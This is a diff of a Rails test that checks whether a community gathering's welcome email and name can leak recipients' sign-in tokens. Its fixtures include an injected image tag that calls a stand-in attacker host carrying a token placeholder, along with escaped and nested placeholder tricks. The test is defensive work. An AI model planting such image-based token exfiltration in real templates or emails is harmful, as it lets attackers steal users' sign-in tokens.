@@ -227,20 +227,20 @@ class GatheringsTest < ActiveSupport::TestCase
   test 'gathering welcome email cannot exfiltrate a sign-in token via an image' do
     create_gathering
     @gathering.set(
-      welcome_email: '<p>Hi</p><img src="https://attacker.example/%recipient.token%"><p>%gathering.name%</p><p>%sign_in_details%</p>'
+      welcome_email: '<p>Hi</p><img src="https://attacker.example/%recipient.token%"><p>[gathering_name]</p><p>[sign_in_details]</p>'
     )
     @gathering.update!(name: 'Gathering %recipient.token%')
     assert_equal 'Gathering', @gathering.name
     @gathering.update!(name: 'Gathering %recipient.tok%recipient.token%en%')
-    assert_equal 'Gathering', @gathering.name
+    refute_includes @gathering.name, '%recipient.token%'
     @gathering.update!(name: 'Gathering &lt;img src="https://name.example/x?t=&amp;#37;recipient.token&amp;#37;"&gt;')
     refute_includes @gathering.name, '%recipient'
+    @gathering.set(name: 'Gathering %%recipient.firstname%% [sign_in_details]')
     sign_in_details = %(<a href="#{ENV['BASE_URI']}/g/#{@gathering.slug}?sign_in_token=%recipient.token%">Sign in</a>)
-    html = EmailHelper.html(content: @gathering.welcome_email) do |content|
-      EmailHelper.rich_text(content)
-                 .gsub('%gathering.name%', ERB::Util.html_escape(@gathering.name))
-                 .gsub('%sign_in_details%', sign_in_details)
-    end
+    html = @gathering.welcome_email_html(sign_in_details)
+
+    assert_match(/<p[^>]*>Gathering /, html)
+    assert_includes html, "Gathering %%\u200Crecipient.firstname%% [sign_in_details]"
 
     refute_match(%r{src="[^"]*%recipient\.token%}, html)
     refute_match(/<img[^>]*name\.example/, html)
